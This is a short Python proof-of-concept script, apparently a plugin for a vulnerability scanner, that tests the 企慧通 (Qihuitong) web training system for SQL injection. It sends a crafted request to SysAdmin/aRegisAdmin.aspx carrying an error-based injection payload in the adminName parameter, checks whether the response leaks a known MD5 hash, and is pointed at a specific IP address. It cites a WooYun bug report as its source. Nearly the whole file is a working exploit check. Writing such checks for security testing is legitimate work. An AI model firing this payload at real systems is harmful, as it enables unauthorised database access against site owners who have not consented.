#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  企慧通培训系统通用型SQL注入 2
Author    :  a
mail      :  a@lcx.cc
 
refer     : http://www.wooyun.org/bugs/wooyun-2015-0129326
 
"""

def assign(service, arg):
    if service == 'qht_study': #企慧通网络培训系统
        return True,arg
def audit(arg):
    p = "SysAdmin/aRegisAdmin.aspx?type=regisAdmin&clientid=adminName&adminName=admin'%20and%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))>0--"
    url = arg + p 
    code2, head, res, errcode, _ = curl.curl2(url )
     
    if (code2 ==500) and ('0x81dc9bdb52d04dc20036dbd8313ed055' in res):  
        security_hole(url)


if __name__ == '__main__':
    from dummy import *
    audit(assign('qht_study', 'http://124.193.233.233/')[1])